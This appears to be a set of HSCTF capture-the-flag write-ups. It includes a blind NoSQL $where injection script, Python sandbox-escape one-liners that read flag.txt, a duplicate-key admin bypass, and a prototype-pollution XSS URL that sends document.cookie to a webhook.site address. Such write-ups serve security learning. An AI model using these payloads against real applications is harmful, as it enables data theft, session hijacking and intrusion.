## Description

hsctf p2w confirmed?

Files: [flag-shop.zip](https://hsctf-10-resources.storage.googleapis.com/uploads/df88d268088ef2d91124e94d9a5ac5990bc08e3bfad8e2fc1c5c552e4bcf574e/flag-shop.zip)

## Solution

Looking through the source you could inject javascript into the query which would help you find the flag:

```js
"$where": f"this.challenge.includes('{request.json['search']}')"
```

The method I used was comparing the char values and use binary search to quicky find the flag:

```python
import requests
import time

url = 'http://flag-shop.hsctf.com/api/search'

headers = {'Content-type': 'application/json'}

current = ""

def check(req):
        return len(req.json()['results']) > 0 and {"challenge": "flag-shop", "price": 10} in req.json()['results']

def checkAndReduce(x,y,index):
        print(x,y)

        if x==y:
                return chr(int(x))

        mid = (y-x)/2

        if not int(mid)==mid:
                mid = mid - 0.5

        start1 = x
        end1 = x + mid
        start2 = end1+1
        end2 = y

        req = requests.post(url, json={'search': f"') && (this.flag.charCodeAt({index})>={start1} && this.flag.charCodeAt({index})<={end1} && '1' == '1"})

        if check(req):
                return checkAndReduce(start1,end1,index)

        req = requests.post(url, json={'search': f"') && (this.flag.charCodeAt({index})>={start2} && this.flag.charCodeAt({index})<={end2} && '1' == '1"})

        return checkAndReduce(start2,end2,index)

arr = []

for i in range(28):
        arr.append(checkAndReduce(33,126,i))
        print(arr)
```

This will eventually output:
```python
['f', 'l', 'a', 'g', '{', 'h', 's', 'c', 't', 'f', '_', 'g', 'a', 'c', 'h', 'a', '_', 'g', 'a', 'm', 'e', '_', 'w', 'h', 'e', 'n', '?', '}']
```

Which is:
```flag{hsctf_gacha_game_when?}```

# Bank

## Description

``nc bank.hsctf.com 1337``

File: [Bank.pdf](https://hsctf-10-resources.storage.googleapis.com/uploads/e897a468fea4fcaa4b7bb12e5ff30f3cfe3668e43e494519fb44a9f30f345c9b/Bank.pdf)

## Solution

My solution was to recursively find available accounts to hack by finding the account with the closest end time that was atleast 10 minutes away from the current time:

```python
from pwn import *

io = remote('bank.hsctf.com', 1337)

for i in range(5):
        num = int(io.recvline().decode('utf-8'))

        accounts = []

        for x in range(num):
                data = io.recvline().decode('utf-8').split(' ')
                accounts.append([int(c) for c in data])

        print(accounts)

        hacked = 0

        time = 0

        while True:
                first = [10000000,10000000000]

                for c in accounts:
                        if c[1] < first[1]:
                                if time + 10 <= c[1]:
                                        first=c

                if first == [10000000,10000000000]:
                        break

                if time < first[0]:
                        time = first[0]+10
                else:
                        time = time + 10

                hacked = hacked + 1

                print(type(accounts),type(first))

                accounts.remove(first)

        print("Got Here", hacked)

        io.sendline(str(hacked))


print(io.recvline())
```

The script will print:
``flag{gr33dy_4lg0r1thm_048cc38517}`` along with some debug info

# producing-3s

## Description

``nc producing-3s.hsctf.com 1337``

File: [producing-3s.pdf](https://hsctf-10-resources.storage.googleapis.com/uploads/404c0962d973ad42710830bd725c227410a847d8b1585fd0ed42ed5c1bac97dd/producing-3s.pdf)

## Solution

This challenge seemed easier than banks for me. First I took all numbers and just took the ones digit since other digits don't affect the ones digit in multiplication. I then Ignored all multiples of 2 and 5 since multiplying them by any number can never get 3 in the ones digit. I then setup a test case for 1,3,7,9:

```python
from pwn import *
import time


io = remote('producing-3s.hsctf.com', 1337)

cases = int(io.recvline().decode('utf-8'))

# cases = 1

for i in range(cases):
#       time.sleep(1)
        inp = io.recvline().decode('utf-8')

        print(inp)

        nums = int(inp)

        sent = io.recvline().decode('utf-8').split(' ')
        sent.pop()

        data = [abs(int(c))%10 for c in sent]

        print(data)

        # Filters
        out = ['N' if c%2==0 or c%5==0 else c for c in data]

        # print(data)

        for i in range(nums):
                if data[i]==3:
                        out[i]='Y'
                if data[i]==1:
                        if 'Y' in out[0:i]:
                                out[i]='Y'
                if data[i]==9:
                        if 7 in data[0:i]:
                                out[i]='Y'
                        elif data[0:i].count(3) >= 3:
                                out[i]='Y'
                        elif 9 in data[0:i] and 3 in data[0:i]:
                                out[i]='Y'
                if data[i]==7:
                        if 9 in data[0:i]:
                                out[i]='Y'
                        elif data[0:i].count(3) >= 2:
                                out[i]='Y'
                        elif data[0:i].count(7) >= 2:
                                out[i]='Y'
                if isinstance(out[i], int):
                        out[i]='N'

        # print(out)

        print(''.join(out))

        io.sendline(''.join(out))


print(io.recvline())
print(io.recvline())
io.interactive()
```

This script gets the flag:
``flag{n1c3_w0rk_8329}`` along with LOTS of debug info

## Solution

Mariadb and python have different methods of parsing JSON. By including two ``admin`` keys and setting the first one to true and the second one to false, the python check will pass since it reads the second key while mariadb will store the admin as being true since it uses the first key.

# vulpes-vulpes

## Description

```
The red fox (Vulpes vulpes) is the largest of the true foxes and one of the most widely distributed members of the order Carnivora, being present across the entire Northern Hemisphere including most of North America, Europe and Asia, plus parts of North Africa. It is listed as least concern by the IUCN. Its range has increased alongside human expansion, having been introduced to Australia, where it is considered harmful to native mammals and bird populations. Due to its presence in Australia, it is included on the list of the "world's 100 worst invasive species".
```

## Solution

The description references FireFox and the file provided is a firefox profile folder. By setting your FireFox profile to it then restoring session history a website where you store secrets appears. In the extensions menu there is a Tampermonkey script that will fill the password for you automatically. Using that you find the flag: ``flag{dunning_kruger?_is_that_some_kind_of_bird?}``

# fast-forward

## Solution

The pyjail removes some builtins and also prevents using atttributes where the attribute name length is greater than 5 characters. The solution uses the ``vars`` method to iterate through dictionaries and call methods using that. The license method allows you to print files if your overwrite the filename and then reset the object.

```
> vars(vars()["license"])["_Printer__lines"]=None
> print(vars(vars()["license"])["_Printer__lines"])
> vars(vars()["license"])["_Printer__filenames"]=["flag.txt"]
> print(vars()["license"]())
```

# fast-forward-v2

## Description

```
I made Python even faster than before!

## Solution

This pyjail is a bit more complicated. It removes all globals with a length greater than 4 and prevents any attributes length greater than 4. Thankfully we can call both vars and type. By using the type method ``__subclasses__`` on the base object class we can get all classes including a printer class. By creating this class and then the print method we can print the flag (use the exit method to get content):

```python
exit(vars(vars(type)["__subclasses__"](type.mro(type({}))[1])[99])['get_data'](vars(type)["__subclasses__"](type.mro(type({}))[1])[99]('flag.txt','./'),'flag.txt'))

## Solution

The page uses two packages [arg.js](https://github.com/stretchr/arg.js) and [insane](https://github.com/bevacqua/insane/) both which have security vulnerabilities. Use [this](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md) we can pollute the base prototype and add properties too it. This won't let us add elements to the ``allowedTags`` array because prototype can't change arrays, but we can add elements to the ``allowedAttributes`` element. We can create an element ``img`` with a string value. Looking at the insane source [code](https://github.com/bevacqua/insane/blob/master/sanitizer.js#L43) we see that the two methods called on the ``img`` element value will be ``concat`` and ``indexOf``. Both of these methods are present on strings so we can use that. Making the string value equal to ``idonloadsrc`` we can use attributes ``id``, ``onload``, and ``src``. The final url will be:

```
http://fancier-page.hsctf.com/display.html?content=%3Cimg%20id%3D%22test%22%20src%3D%22https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fen%2Fa%2Fa9%2FExample.jpg%22%20onload%3D%22fetch(%27https%3A%2F%2Fwebhook.site%2F359d48f7-538e-4150-bb48-e961695ba4ad%3F%27%2Bdocument.cookie)%22%3E&background_color=%23ffffff&color=%23000000&font=Helvetica&font_size=16#__proto__[img]=idsrconload
